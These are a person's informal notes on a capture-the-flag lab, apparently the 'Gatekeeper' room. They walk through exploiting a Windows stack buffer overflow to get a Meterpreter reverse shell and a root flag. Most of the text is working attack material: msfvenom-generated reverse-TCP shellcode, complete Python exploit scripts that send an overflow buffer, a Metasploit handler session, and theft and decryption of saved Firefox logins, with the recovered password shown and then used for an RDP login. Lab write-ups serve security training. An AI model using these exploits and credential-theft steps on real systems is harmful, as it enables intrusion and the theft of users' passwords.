{H4lf_W4y_Th3r3}

The buffer overflow in this room is credited to Justin Steven and his 
"dostackbufferoverflowgood" program.  Thank you!


now using metasploit so generate a meterpreter with msfconsole and replace or create a new one exploit.py

Privilege Escalation

While performing enumeration of common files and folders, found out that Mozilla Firefox is installed on the box, so decided to use Metasploit to exctract browser credentials.

Generating Meterpreter shellcode using the following flags:

    -p to specify the payload type, in this case, the Windows Meterpreter Reverse TCP Shell
    LHOST to specify the localhost IP address to connect to
    LPORT to specify the local port to connect to
    -f to specify the format
    -b to specify the bad characters
    -e to specify the encoder
    -v to specify the name of the variable used for the shellcode

┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.81.220 LPORT=1337 -e x86/shikata_ga_nai -f exe -b "\x00\xa" -f python -v payload
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of python file: 2064 bytes
payload =  b""
payload += b"\xba\x3b\x9f\xe4\xe2\xda\xc0\xd9\x74\x24\xf4"
payload += b"\x5f\x29\xc9\xb1\x59\x31\x57\x14\x03\x57\x14"
payload += b"\x83\xc7\x04\xd9\x6a\x18\x0a\x92\x95\xe1\xcb"
payload += b"\xcc\xa4\x33\xaf\x87\x95\x83\xbb\xc5\x15\x6f"
payload += b"\xe9\xfd\xac\x8a\x85\x8f\x86\x5b\x2d\x25\xf1"
payload += b"\x52\xae\x88\x3d\x38\x6c\x8b\xc1\x43\xa1\x6b"
payload += b"\xfb\x8b\xb4\x6a\x3c\x5a\xb2\x83\x90\xd6\x6e"
payload += b"\x4b\x9e\xab\xb2\x3c\xa1\xfb\x40\x82\xd9\x7e"
payload += b"\x96\x76\x56\x80\xc7\xfd\x3e\xa2\xb7\x8a\xf7"
payload += b"\xba\x36\x5f\x82\x72\x4c\x63\xbc\x7b\xe4\x10"
payload += b"\x8a\x08\xf6\xf0\xc2\xce\x55\x3d\xeb\xc2\xa4"
payload += b"\x7a\xcc\x3c\xd3\x70\x2e\xc0\xe4\x43\x4c\x1e"
payload += b"\x60\x53\xf6\xd5\xd2\xb7\x06\x39\x84\x3c\x04"
payload += b"\xf6\xc2\x1a\x09\x09\x06\x11\x35\x82\xa9\xf5"
payload += b"\xbf\xd0\x8d\xd1\xe4\x83\xac\x40\x41\x65\xd0"
payload += b"\x92\x2d\xda\x74\xd9\xdc\x0d\x08\x22\x1f\x32"
payload += b"\x54\xb4\xd3\xff\x67\x44\x7c\x77\x1b\x76\x23"
payload += b"\x23\xb3\x3a\xac\xed\x44\x4b\xba\x0d\x9a\xf3"
payload += b"\xab\xf3\x1b\x03\xe5\x37\x4f\x53\x9d\x9e\xf0"
payload += b"\x38\x5d\x1e\x25\xd4\x57\x88\xcc\x23\x39\x94"
payload += b"\xb9\x31\xb9\x21\x03\xbc\x5f\x79\x23\xee\xcf"
payload += b"\x3a\x93\x4e\xa0\xd2\xf9\x41\x9f\xc3\x01\x88"
payload += b"\x88\x6e\xee\x64\xe0\x06\x97\x2d\x7a\xb6\x58"
payload += b"\xf8\x06\xf8\xd3\x08\xf6\xb7\x13\x79\xe4\xa0"
payload += b"\x43\x81\xf4\x30\xe6\x81\x9e\x34\xa0\xd6\x36"
payload += b"\x37\x95\x10\x99\xc8\xf0\x23\xde\x37\x85\x15"
payload += b"\x94\x0e\x13\x19\xc2\x6e\xf3\x99\x12\x39\x99"
payload += b"\x99\x7a\x9d\xf9\xca\x9f\xe2\xd7\x7f\x0c\x77"
payload += b"\xd8\x29\xe0\xd0\xb0\xd7\xdf\x17\x1f\x28\x0a"
payload += b"\x24\x58\xd6\xc8\x03\xc1\xbe\x32\x14\xf1\x3e"
payload += b"\x59\x94\xa1\x56\x96\xbb\x4e\x96\x57\x16\x07"
payload += b"\xbe\xd2\xf7\xe5\x5f\xe2\xdd\xa8\xc1\xe3\xd2"
payload += b"\x70\xf2\x9e\x9b\x87\xf3\x5e\xb2\xe3\xf4\x5e"
payload += b"\xba\x15\xc9\x88\x83\x63\x0c\x09\xb0\x7c\x3b"
payload += b"\x2c\x91\x16\x43\x62\xe1\x32"


remember the padding just to ge no errors

┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ cat exploit_msf.py 
import socket

ip = "10.10.118.64"
port = 31337

#prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
payload =  b""
payload += b"\xba\x3b\x9f\xe4\xe2\xda\xc0\xd9\x74\x24\xf4"
payload += b"\x5f\x29\xc9\xb1\x59\x31\x57\x14\x03\x57\x14"
payload += b"\x83\xc7\x04\xd9\x6a\x18\x0a\x92\x95\xe1\xcb"
payload += b"\xcc\xa4\x33\xaf\x87\x95\x83\xbb\xc5\x15\x6f"
payload += b"\xe9\xfd\xac\x8a\x85\x8f\x86\x5b\x2d\x25\xf1"
payload += b"\x52\xae\x88\x3d\x38\x6c\x8b\xc1\x43\xa1\x6b"
payload += b"\xfb\x8b\xb4\x6a\x3c\x5a\xb2\x83\x90\xd6\x6e"
payload += b"\x4b\x9e\xab\xb2\x3c\xa1\xfb\x40\x82\xd9\x7e"
payload += b"\x96\x76\x56\x80\xc7\xfd\x3e\xa2\xb7\x8a\xf7"
payload += b"\xba\x36\x5f\x82\x72\x4c\x63\xbc\x7b\xe4\x10"
payload += b"\x8a\x08\xf6\xf0\xc2\xce\x55\x3d\xeb\xc2\xa4"
payload += b"\x7a\xcc\x3c\xd3\x70\x2e\xc0\xe4\x43\x4c\x1e"
payload += b"\x60\x53\xf6\xd5\xd2\xb7\x06\x39\x84\x3c\x04"
payload += b"\xf6\xc2\x1a\x09\x09\x06\x11\x35\x82\xa9\xf5"
payload += b"\xbf\xd0\x8d\xd1\xe4\x83\xac\x40\x41\x65\xd0"
payload += b"\x92\x2d\xda\x74\xd9\xdc\x0d\x08\x22\x1f\x32"
payload += b"\x54\xb4\xd3\xff\x67\x44\x7c\x77\x1b\x76\x23"
payload += b"\x23\xb3\x3a\xac\xed\x44\x4b\xba\x0d\x9a\xf3"
payload += b"\xab\xf3\x1b\x03\xe5\x37\x4f\x53\x9d\x9e\xf0"
payload += b"\x38\x5d\x1e\x25\xd4\x57\x88\xcc\x23\x39\x94"
payload += b"\xb9\x31\xb9\x21\x03\xbc\x5f\x79\x23\xee\xcf"
payload += b"\x3a\x93\x4e\xa0\xd2\xf9\x41\x9f\xc3\x01\x88"
payload += b"\x88\x6e\xee\x64\xe0\x06\x97\x2d\x7a\xb6\x58"
payload += b"\xf8\x06\xf8\xd3\x08\xf6\xb7\x13\x79\xe4\xa0"
payload += b"\x43\x81\xf4\x30\xe6\x81\x9e\x34\xa0\xd6\x36"
payload += b"\x37\x95\x10\x99\xc8\xf0\x23\xde\x37\x85\x15"
payload += b"\x94\x0e\x13\x19\xc2\x6e\xf3\x99\x12\x39\x99"
payload += b"\x99\x7a\x9d\xf9\xca\x9f\xe2\xd7\x7f\x0c\x77"
payload += b"\xd8\x29\xe0\xd0\xb0\xd7\xdf\x17\x1f\x28\x0a"
payload += b"\x24\x58\xd6\xc8\x03\xc1\xbe\x32\x14\xf1\x3e"
payload += b"\x59\x94\xa1\x56\x96\xbb\x4e\x96\x57\x16\x07"
payload += b"\xbe\xd2\xf7\xe5\x5f\xe2\xdd\xa8\xc1\xe3\xd2"
payload += b"\x70\xf2\x9e\x9b\x87\xf3\x5e\xb2\xe3\xf4\x5e"
payload += b"\xba\x15\xc9\x88\x83\x63\x0c\x09\xb0\x7c\x3b"
payload += b"\x2c\x91\x16\x43\x62\xe1\x32"
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")


----

┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ cat exploit_msf.py 
import socket

ip = "10.10.118.64"
port = 31337

#prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
payload =  ("\xba\x3b\x9f\xe4\xe2\xda\xc0\xd9\x74\x24\xf4"
"\x5f\x29\xc9\xb1\x59\x31\x57\x14\x03\x57\x14"
"\x83\xc7\x04\xd9\x6a\x18\x0a\x92\x95\xe1\xcb"
"\xcc\xa4\x33\xaf\x87\x95\x83\xbb\xc5\x15\x6f"
"\xe9\xfd\xac\x8a\x85\x8f\x86\x5b\x2d\x25\xf1"
"\x52\xae\x88\x3d\x38\x6c\x8b\xc1\x43\xa1\x6b"
"\xfb\x8b\xb4\x6a\x3c\x5a\xb2\x83\x90\xd6\x6e"
"\x4b\x9e\xab\xb2\x3c\xa1\xfb\x40\x82\xd9\x7e"
"\x96\x76\x56\x80\xc7\xfd\x3e\xa2\xb7\x8a\xf7"
"\xba\x36\x5f\x82\x72\x4c\x63\xbc\x7b\xe4\x10"
"\x8a\x08\xf6\xf0\xc2\xce\x55\x3d\xeb\xc2\xa4"
"\x7a\xcc\x3c\xd3\x70\x2e\xc0\xe4\x43\x4c\x1e"
"\x60\x53\xf6\xd5\xd2\xb7\x06\x39\x84\x3c\x04"
"\xf6\xc2\x1a\x09\x09\x06\x11\x35\x82\xa9\xf5"
"\xbf\xd0\x8d\xd1\xe4\x83\xac\x40\x41\x65\xd0"
"\x92\x2d\xda\x74\xd9\xdc\x0d\x08\x22\x1f\x32"
"\x54\xb4\xd3\xff\x67\x44\x7c\x77\x1b\x76\x23"
"\x23\xb3\x3a\xac\xed\x44\x4b\xba\x0d\x9a\xf3"
"\xab\xf3\x1b\x03\xe5\x37\x4f\x53\x9d\x9e\xf0"
"\x38\x5d\x1e\x25\xd4\x57\x88\xcc\x23\x39\x94"
"\xb9\x31\xb9\x21\x03\xbc\x5f\x79\x23\xee\xcf"
"\x3a\x93\x4e\xa0\xd2\xf9\x41\x9f\xc3\x01\x88"
"\x88\x6e\xee\x64\xe0\x06\x97\x2d\x7a\xb6\x58"
"\xf8\x06\xf8\xd3\x08\xf6\xb7\x13\x79\xe4\xa0"
"\x43\x81\xf4\x30\xe6\x81\x9e\x34\xa0\xd6\x36"
"\x37\x95\x10\x99\xc8\xf0\x23\xde\x37\x85\x15"
"\x94\x0e\x13\x19\xc2\x6e\xf3\x99\x12\x39\x99"
"\x99\x7a\x9d\xf9\xca\x9f\xe2\xd7\x7f\x0c\x77"
"\xd8\x29\xe0\xd0\xb0\xd7\xdf\x17\x1f\x28\x0a"
"\x24\x58\xd6\xc8\x03\xc1\xbe\x32\x14\xf1\x3e"
"\x59\x94\xa1\x56\x96\xbb\x4e\x96\x57\x16\x07"
"\xbe\xd2\xf7\xe5\x5f\xe2\xdd\xa8\xc1\xe3\xd2"
"\x70\xf2\x9e\x9b\x87\xf3\x5e\xb2\xe3\xf4\x5e"
"\xba\x15\xc9\x88\x83\x63\x0c\x09\xb0\x7c\x3b"
"\x2c\x91\x16\x43\x62\xe1\x32")
postfix = ""
buffer = overflow + retn + padding + payload + postfix 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

----

not work so create again msfvenom

                                                                           
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.81.220 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 402 (iteration=0)
x86/shikata_ga_nai chosen with final size 402
Payload size: 402 bytes
Final size of c file: 1719 bytes
unsigned char buf[] = 
"\xbd\x2d\xb5\x15\xfb\xdd\xc6\xd9\x74\x24\xf4\x58\x29\xc9"
"\xb1\x5e\x31\x68\x15\x83\xc0\x04\x03\x68\x11\xe2\xd8\x49"
"\xfd\x74\x22\xb2\xfe\xea\xab\x57\xcf\x38\xcf\x1c\x62\x8d"
"\x84\x71\x8f\x66\xc8\x61\x80\xcf\xa6\xaf\x15\x5d\x1e\x81"
"\xd6\x93\x9e\x4d\x14\xb5\x62\x8c\x49\x15\x5b\x5f\x9c\x54"
"\x9c\x29\xea\xb9\x70\x21\x46\x56\x23\xbe\x25\x6a\xca\x10"
"\x22\xd2\xb4\x15\xf5\xa7\x08\x17\x26\xcc\xd8\x0f\x4d\x8b"
"\xf8\x7f\x50\xff\x7d\xb6\x26\xc3\x4c\xb6\x8e\xb0\x9a\xc3"
"\x10\x11\xd3\x13\xd3\x52\x1e\x38\xd5\xab\x18\xa0\xa3\xc7"
"\x5b\x5d\xb4\x13\x26\xb9\x31\x84\x80\x4a\xe1\x60\x31\x9e"
"\x74\xe2\x3d\x6b\xf2\xac\x21\x6a\xd7\xc6\x5d\xe7\xd6\x08"
"\xd4\xb3\xfc\x8c\xbd\x60\x9c\x95\x1b\xc6\xa1\xc6\xc3\xb7"
"\x07\x8c\xe1\xae\x38\x6d\xfa\xce\x64\xfa\x37\x03\x97\xfa"
"\x5f\x14\xe4\xc8\xc0\x8e\x62\x61\x89\x08\x74\xf0\x9d\xaa"
"\xaa\xba\xcd\x54\x4b\xbb\xc4\x92\x1f\xeb\x7e\x32\x20\x60"
"\x7e\xbb\xf5\x1d\x74\x2b\xfc\xea\xd9\x77\x68\xef\xd9\x96"
"\x35\x66\x3f\xc8\x95\x28\xef\xa9\x45\x89\x5f\x42\x8c\x06"
"\x80\x72\xaf\xcc\xa9\x19\x40\xb9\x82\xb5\xf9\xe0\x58\x27"
"\x05\x3f\x25\x67\x8d\xca\xda\x26\x66\xbe\xc8\x5f\x11\x40"
"\x10\xa0\xb4\x40\x7a\xa4\x1e\x16\x12\xa6\x47\x50\xbd\x59"
"\xa2\xe2\xb9\xa6\x33\xd3\xb2\x91\xa1\x5b\xac\xdd\x25\x5c"
"\x2c\x88\x2f\x5c\x44\x6c\x14\x0f\x71\x73\x81\x23\x2a\xe6"
"\x2a\x12\x9f\xa1\x42\x98\xc6\x86\xcc\x63\x2d\x95\x0b\x9b"
"\xb0\xb2\xb3\xf4\x4a\x83\x43\x05\x20\x03\x14\x6d\xbf\x2c"
"\x9b\x5d\x40\xe7\xf4\xf5\xcb\x66\xb6\x64\xcc\xa2\x16\x39"
"\xcd\x41\x83\xca\xb4\x2a\x34\x2b\x49\x23\x51\x2b\x4a\x4b"
"\x67\x17\x9d\x72\x1d\x56\x1e\xc1\x3e\x45\x8a\x3c\xd7\xd0"
"\x5f\xfd\xba\xe2\x8a\xc2\xc2\x60\x3e\xbb\x30\x78\x4b\xbe"
"\x7d\x3e\xa0\xb2\xee\xab\xc6\x61\x0e\xfe";
                                                                           
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ nano exploit_msf.py
                                                                           
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ python exploit_msf.py 
Sending evil buffer...
Done!
                                                                           
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ cat exploit_msf.py
import socket

ip = "10.10.118.64"
port = 31337

#prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
payload =  ("\xbd\x2d\xb5\x15\xfb\xdd\xc6\xd9\x74\x24\xf4\x58\x29\xc9"
"\xb1\x5e\x31\x68\x15\x83\xc0\x04\x03\x68\x11\xe2\xd8\x49"
"\xfd\x74\x22\xb2\xfe\xea\xab\x57\xcf\x38\xcf\x1c\x62\x8d"
"\x84\x71\x8f\x66\xc8\x61\x80\xcf\xa6\xaf\x15\x5d\x1e\x81"
"\xd6\x93\x9e\x4d\x14\xb5\x62\x8c\x49\x15\x5b\x5f\x9c\x54"
"\x9c\x29\xea\xb9\x70\x21\x46\x56\x23\xbe\x25\x6a\xca\x10"
"\x22\xd2\xb4\x15\xf5\xa7\x08\x17\x26\xcc\xd8\x0f\x4d\x8b"
"\xf8\x7f\x50\xff\x7d\xb6\x26\xc3\x4c\xb6\x8e\xb0\x9a\xc3"
"\x10\x11\xd3\x13\xd3\x52\x1e\x38\xd5\xab\x18\xa0\xa3\xc7"
"\x5b\x5d\xb4\x13\x26\xb9\x31\x84\x80\x4a\xe1\x60\x31\x9e"
"\x74\xe2\x3d\x6b\xf2\xac\x21\x6a\xd7\xc6\x5d\xe7\xd6\x08"
"\xd4\xb3\xfc\x8c\xbd\x60\x9c\x95\x1b\xc6\xa1\xc6\xc3\xb7"
"\x07\x8c\xe1\xae\x38\x6d\xfa\xce\x64\xfa\x37\x03\x97\xfa"
"\x5f\x14\xe4\xc8\xc0\x8e\x62\x61\x89\x08\x74\xf0\x9d\xaa"
"\xaa\xba\xcd\x54\x4b\xbb\xc4\x92\x1f\xeb\x7e\x32\x20\x60"
"\x7e\xbb\xf5\x1d\x74\x2b\xfc\xea\xd9\x77\x68\xef\xd9\x96"
"\x35\x66\x3f\xc8\x95\x28\xef\xa9\x45\x89\x5f\x42\x8c\x06"
"\x80\x72\xaf\xcc\xa9\x19\x40\xb9\x82\xb5\xf9\xe0\x58\x27"
"\x05\x3f\x25\x67\x8d\xca\xda\x26\x66\xbe\xc8\x5f\x11\x40"
"\x10\xa0\xb4\x40\x7a\xa4\x1e\x16\x12\xa6\x47\x50\xbd\x59"
"\xa2\xe2\xb9\xa6\x33\xd3\xb2\x91\xa1\x5b\xac\xdd\x25\x5c"
"\x2c\x88\x2f\x5c\x44\x6c\x14\x0f\x71\x73\x81\x23\x2a\xe6"
"\x2a\x12\x9f\xa1\x42\x98\xc6\x86\xcc\x63\x2d\x95\x0b\x9b"
"\xb0\xb2\xb3\xf4\x4a\x83\x43\x05\x20\x03\x14\x6d\xbf\x2c"
"\x9b\x5d\x40\xe7\xf4\xf5\xcb\x66\xb6\x64\xcc\xa2\x16\x39"
"\xcd\x41\x83\xca\xb4\x2a\x34\x2b\x49\x23\x51\x2b\x4a\x4b"
"\x67\x17\x9d\x72\x1d\x56\x1e\xc1\x3e\x45\x8a\x3c\xd7\xd0"
"\x5f\xfd\xba\xe2\x8a\xc2\xc2\x60\x3e\xbb\x30\x78\x4b\xbe"
"\x7d\x3e\xa0\xb2\xee\xab\xc6\x61\x0e\xfe")
postfix = ""
buffer = overflow + retn + padding + payload + postfix 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")


yep was prolly a problem with the port 1337 so I change port 4444

┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.11.81.220
lhost => 10.11.81.220
msf6 exploit(multi/handler) > set lport 1337
lport => 1337
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.11.81.220:1337 
^C[-] Exploit failed [user-interrupt]: Interrupt 
[-] exploit: Interrupted
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh
                                        , thread, process, none)
   LHOST     10.11.81.220     yes       The listen address (an interface
                                        may be specified)
   LPORT     1337             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.11.81.220:4444 
[*] Sending stage (175686 bytes) to 10.10.118.64
[*] Meterpreter session 1 opened (10.11.81.220:4444 -> 10.10.118.64:49215) at 2022-09-30 14:27:13 -0400

meterpreter > sysinfo
Computer        : GATEKEEPER
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > ls
Listing: C:\Users\natbat\Desktop
================================

Mode            Size   Type  Last modified            Name
----            ----   ----  -------------            ----
100666/rw-rw-r  1197   fil   2020-04-21 17:00:33 -04  Firefox.lnk
w-                           00
100666/rw-rw-r  282    fil   2020-04-21 16:57:09 -04  desktop.ini
w-                           00
100777/rwxrwxr  13312  fil   2020-04-20 01:27:17 -04  gatekeeper.exe
wx                           00
100777/rwxrwxr  135    fil   2020-04-21 21:53:23 -04  gatekeeperstart.bat
wx                           00
100666/rw-rw-r  140    fil   2020-05-14 21:43:14 -04  user.txt.txt
w-                           00

meterpreter > cat user.txt.txt
{H4lf_W4y_Th3r3}

The buffer overflow in this room is credited to Justin Steven and his 
"dostackbufferoverflowgood" program.  Thank you!meterpreter > 


now the party will be start now privilege escalation time

when i run ls command in back screen i found Firefox.lnk

Firefox.lnk this is shortcut icon thats meaning this machine have firefox browser

why not try dump the credential lets try

ok now press ctrl+z in meterpreter shell and choose yes kept it in background

and now use the post/multi/gather/firefox_creds to dump the users credential

use post/multi/gather/firefox_creds


meterpreter > 
Background session 1? [y/N]  y
[-] Unknown command: y
msf6 exploit(multi/handler) > use post/multi/gather/firefox_creds
msf6 post(multi/gather/firefox_creds) > options

Module options (post/multi/gather/firefox_creds):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   DECRYPT  false            no        Decrypts passwords without third p
                                       arty tools
   SESSION                   yes       The session to run this module on

msf6 post(multi/gather/firefox_creds) > sessions

Active sessions
===============

  Id  Name  Type                 Information          Connection
  --  ----  ----                 -----------          ----------
  1         meterpreter x86/win  GATEKEEPER\natbat @  10.11.81.220:4444 -
            dows                  GATEKEEPER          > 10.10.118.64:4921
                                                      5 (10.10.118.64)

msf6 post(multi/gather/firefox_creds) > set session 1
session => 1
msf6 post(multi/gather/firefox_creds) > run

[-] Error loading USER S-1-5-21-663372427-3699997616-3390412905-1000: Hive could not be loaded, are you Admin?
[*] Checking for Firefox profile in: C:\Users\natbat\AppData\Roaming\Mozilla\

[*] Profile: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
[+] Downloaded cert9.db: /home/kali/.msf4/loot/20220930143441_default_10.10.118.64_ff.ljfn812a.cert_019696.bin
[+] Downloaded cookies.sqlite: /home/kali/.msf4/loot/20220930143448_default_10.10.118.64_ff.ljfn812a.cook_754563.bin
[+] Downloaded key4.db: /home/kali/.msf4/loot/20220930143453_default_10.10.118.64_ff.ljfn812a.key4_906255.bin
[+] Downloaded logins.json: /home/kali/.msf4/loot/20220930143457_default_10.10.118.64_ff.ljfn812a.logi_051444.bin

[*] Profile: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\rajfzh3y.default

[*] Post module execution completed

now it dump the info in this path /home/kali/.msf4/loot/

show in your terminal whats the path

now i try to decrypt the info by this tool

https://github.com/unode/firefox_decrypt

we should change the filse name to cert9.db,cookies.sqlite,login.json and key4.db

ok now i will rename all files


┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ ls
badchar.py  exploit_msf.py  exploit.py  gatekeeper.exe
                                                                           
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ cd /home/kali/.msf4/loot/   
                                                                           
┌──(kali㉿kali)-[~/.msf4/loot]
└─$ ls
20220819200040_default_10.10.106.201_mysql_schema_117039.txt
20220824141321_default_10.10.89.18_linux.passwd_244906.txt
20220824141321_default_10.10.89.18_linux.shadow_939492.txt
20220824141322_default_10.10.89.18_linux.hashes_824448.txt
20220824141322_default_10.10.89.18_linux.passwd.his_659025.txt
20220930143441_default_10.10.118.64_ff.ljfn812a.cert_019696.bin
20220930143448_default_10.10.118.64_ff.ljfn812a.cook_754563.bin
20220930143453_default_10.10.118.64_ff.ljfn812a.key4_906255.bin
20220930143457_default_10.10.118.64_ff.ljfn812a.logi_051444.bin
                                                                           
┌──(kali㉿kali)-[~/.msf4/loot]
└─$ mv 20220930143441_default_10.10.118.64_ff.ljfn812a.cert_019696.bin cert9.db
                                                                           
┌──(kali㉿kali)-[~/.msf4/loot]
└─$ mv 20220930143448_default_10.10.118.64_ff.ljfn812a.cook_754563.bin cookies.sqlite
                                                                           
┌──(kali㉿kali)-[~/.msf4/loot]
└─$ mv 20220930143453_default_10.10.118.64_ff.ljfn812a.key4_906255.bin key4.db
                                                                           
┌──(kali㉿kali)-[~/.msf4/loot]
└─$ mv 20220930143457_default_10.10.118.64_ff.ljfn812a.logi_051444.bin logins.json


┌──(kali㉿kali)-[~/.msf4/loot]
└─$ git clone https://github.com/unode/firefox_decrypt.git
Cloning into 'firefox_decrypt'...
remote: Enumerating objects: 1152, done.
remote: Counting objects: 100% (264/264), done.
remote: Compressing objects: 100% (31/31), done.
remote: Total 1152 (delta 246), reused 235 (delta 233), pack-reused 888
Receiving objects: 100% (1152/1152), 411.61 KiB | 1.29 MiB/s, done.
Resolving deltas: 100% (728/728), done.
                                                                           
┌──(kali㉿kali)-[~/.msf4/loot]
└─$ ls
20220819200040_default_10.10.106.201_mysql_schema_117039.txt
20220824141321_default_10.10.89.18_linux.passwd_244906.txt
20220824141321_default_10.10.89.18_linux.shadow_939492.txt
20220824141322_default_10.10.89.18_linux.hashes_824448.txt
20220824141322_default_10.10.89.18_linux.passwd.his_659025.txt
cert9.db
cookies.sqlite
firefox_decrypt
key4.db
logins.json
                                                                           
┌──(kali㉿kali)-[~/.msf4/loot]
└─$ cd firefox_decrypt       
                                                                           
┌──(kali㉿kali)-[~/.msf4/loot/firefox_decrypt]
└─$ ls
AUTHORS  CHANGELOG.md  firefox_decrypt.py  LICENSE  README.md  tests
                                                                           
┌──(kali㉿kali)-[~/.msf4/loot/firefox_decrypt]
└─$ pwd                     
/home/kali/.msf4/loot/firefox_decrypt
                                                                           
┌──(kali㉿kali)-[~/.msf4/loot/firefox_decrypt]
└─$ cp firefox_decrypt.py /home/kali/.msf4/loot/
                                                                           
┌──(kali㉿kali)-[~/.msf4/loot/firefox_decrypt]
└─$ cd ..                                       
                                                                           
┌──(kali㉿kali)-[~/.msf4/loot]
└─$ ls
20220819200040_default_10.10.106.201_mysql_schema_117039.txt
20220824141321_default_10.10.89.18_linux.passwd_244906.txt
20220824141321_default_10.10.89.18_linux.shadow_939492.txt
20220824141322_default_10.10.89.18_linux.hashes_824448.txt
20220824141322_default_10.10.89.18_linux.passwd.his_659025.txt
cert9.db
cookies.sqlite
firefox_decrypt
firefox_decrypt.py
key4.db
logins.json



now i will run the tool by this command

python3 firefox_decrypt.py ./


┌──(kali㉿kali)-[~/.msf4/loot]
└─$ python3 firefox_decrypt.py ./                                  
2022-09-30 14:44:17,187 - WARNING - profile.ini not found in ./
2022-09-30 14:44:17,188 - WARNING - Continuing and assuming './' is a profile location

Website:   https://creds.com
Username: 'mayor'
Password: '8CL7O1N78MdrCIsV'


now use a remote desktop

exit to msfconsole to get response

msf6 post(multi/gather/firefox_creds) > exit
[*] You have active sessions open, to exit anyway type "exit -y"
msf6 post(multi/gather/firefox_creds) > Interrupt: use the 'exit' command to quit
msf6 post(multi/gather/firefox_creds) > 
zsh: suspended  msfconsole -q

┌──(kali㉿kali)-[~/.msf4/loot]
└─$ xfreerdp /u:'mayor' /p:'8CL7O1N78MdrCIsV' /v:10.10.118.64 /size:85%

the root.txt is in Desktop :)

{Th3_M4y0r_C0ngr4tul4t3s_U}

so the machine is pwned 

```

![[Pasted image 20220929231225.png]]

![[Pasted image 20220930102627.png]]

![[Pasted image 20220930102814.png]]

![[Pasted image 20220930103225.png]]

![[Pasted image 20220930104400.png]]

![[Pasted image 20220930104526.png]]

![[Pasted image 20220930111419.png]]

![[Pasted image 20220930113931.png]]

![[Pasted image 20220930122810.png]]

![](https://miro.medium.com/max/720/1*F7wXSDRZKJkrJPu7jzc_sA.png)

![[Pasted image 20220930134720.png]]


Locate and find the User Flag.
*{H4lf_W4y_Th3r3}*



Locate and find the Root Flag
*{Th3_M4y0r_C0ngr4tul4t3s_U}*





[[Brainstorm]]